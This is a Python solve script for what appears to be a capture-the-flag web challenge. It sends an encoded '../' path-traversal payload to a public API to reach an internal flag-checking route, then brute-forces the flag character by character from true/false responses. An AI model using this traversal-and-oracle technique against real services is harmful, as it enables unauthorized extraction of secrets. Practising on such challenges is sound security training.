import requests
import string

url = "http://splitline.tw:5000/public_api"
# curl 'http://splitline.tw:5000/public_api' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://splitline.tw:5000/' -H 'Content-type: application/json' -H 'Origin: http://splitline.tw:5000' -H 'Connection: keep-alive' --data-raw '{"text":"%2e%2e/looksLikeFlag?flag=FLAG{"}'

my_data = "{\"text\":\"%2e%2e/looksLikeFlag?flag=FLAG{"
last = "\"}"
my_header = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'http://splitline.tw:5000/', 
            'Content-type': 'application/json',
            'Origin': 'http://splitline.tw:5000',
            'Connection': 'keep-alive'}

# resp = requests.post(url, headers=my_header, data=data) data = 傳進網頁的資料

while(1):
    for w in list(string.ascii_lowercase):
        data = my_data + w + last
        resp = requests.post(url, headers=my_header, data=data)
        if(resp.text.find('true') >= 0):
            my_data = my_data + w
            break
    if(resp.text.find('false') >= 0):
        for w in range(10):
            a = str(w)
            data = my_data + a + last
            resp = requests.post(url, headers=my_header, data=data)
            if(resp.text.find('true') >= 0):
                my_data = my_data + a
                break
    if(resp.text.find('false') >= 0):
        w = '_'
        data = my_data + w + last
        resp = requests.post(url, headers=my_header, data=data)
        if(resp.text.find('true') >= 0):
            my_data = my_data + w
    if(resp.text.find('false') >= 0):
        w = '}'
        data = my_data + w + last
        resp = requests.post(url, headers=my_header, data=data)
        if(resp.text.find('true') >= 0):
            my_data = my_data + w
            break

print(my_data)


# print(resp.status_code)
